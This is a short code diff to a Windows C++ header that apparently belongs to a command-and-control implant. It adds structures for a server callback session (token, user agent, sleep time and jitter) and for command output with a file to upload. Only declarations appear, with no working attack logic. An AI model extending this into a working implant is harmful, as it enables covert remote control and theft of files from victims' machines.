@@ -6,9 +6,38 @@
 #define STRUCTS_HPP
 #include <Windows.h>
 #include <cstdint>
+#include <string>
 #include <winternl.h>
+#include <winhttp.h>
 
 #define RTL_MAX_DRIVE_LETTERS 32
+
+struct implant_context {
+    HINTERNET hsession = nullptr;
+    HINTERNET hconnect = nullptr;
+
+    std::string server_addr;
+    std::string session_token;
+    std::string callback_object;
+    std::string user_agent;
+
+    uint16_t port;
+    bool is_https;
+
+    uint64_t sleep_time; //milliseconds
+    uint64_t jitter;
+};
+
+enum class output_type : uint32_t {
+    PLAIN_TEXT,
+    FILE
+};
+
+struct command_output {
+    std::string body;
+    HANDLE      file_to_upload  = nullptr;
+    output_type type            = output_type::PLAIN_TEXT;
+};
 
 struct section_map {
     PVOID base;
